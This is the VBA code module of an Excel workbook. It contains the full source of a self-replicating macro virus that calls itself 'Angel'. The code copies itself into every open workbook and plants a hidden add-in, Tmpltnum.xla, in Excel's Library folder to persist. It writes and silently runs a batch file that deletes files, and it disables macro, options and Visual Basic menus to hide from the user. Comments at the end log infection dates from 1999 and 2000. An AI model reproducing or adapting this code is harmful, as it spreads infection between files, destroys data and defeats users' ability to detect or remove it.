   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Workbook_BeforeClose(Cancel As Boolean)
   copyvir2
   Workbooks("Tmpltnum.xla").IsAddin = True
   End Sub

   Private Sub Workbook_Open()
   Call stealth
   If Me.Name = "Tmpltnum.xla" Then
       copyvir2
       Workbooks("Tmpltnum.xla").Save

   Else
       Call deltmplate
   End If
   copyvir2
   Workbooks("Tmpltnum.xla").IsAddin = True
   End Sub
   Sub deltmplate()
   q = Application.Path & "\Library"
   ChDir (q)
   w = Dir("Tmpltnum.xla")
   If UCase(w) = UCase("Tmpltnum.xla") Then
       Workbooks("Tmpltnum.xla").Close
       Open "delxls.bat" For Output As #1
       Print #1, "del Tmpltnum.xla"
       Print #1, "del *.bat"
       Print #1, "exit"
       Close #1
       t = Shell("delxls.bat /c", vbHide)
       Set newBook = Workbooks.Add
       With newBook
           .Title = "Angel"
           .Subject = "Virus"
           .SaveAs FileName:=q & "\Tmpltnum.xla"
       End With
       copyvir2
       Workbooks("Tmpltnum.xla").Save
       x = ActiveWorkbook.Path

   End If

   End Sub

   Sub copyvir2()
   For Each w In Workbooks
    For d = 1 To w.VBProject.VBComponents.Count
     infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
   If infected = True Then
       haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
       code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

   End If
    Next d
   Next w
   For Each w In Workbooks
    For d = 1 To w.VBProject.VBComponents.Count
     infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
   If infected = False Then
        w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code

   End If
    Next d
   Next w
   End Sub
   Sub stealth()

   Application.Dialogs(xlDialogRun).Application.EnableEvents = False
   Application.CommandBars("Tools").Reset
   Application.RecentFiles.Maximum = 0
   Application.CommandBars("Tools").Controls("Macro").Enabled = False
   Application.CommandBars("View").Controls("Toolbars").Enabled = False
   Application.CommandBars("Tools").Controls("Customize...").Enabled = False
   Application.CommandBars("Tools").Controls("Options...").Enabled = False
   Application.CommandBars("Visual Basic").Visible = False
   Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
   End Sub


   'Infected Date :  7/13/1999

   'Infected Date :  2/23/2000
   'Infected Date :  2/23/2000
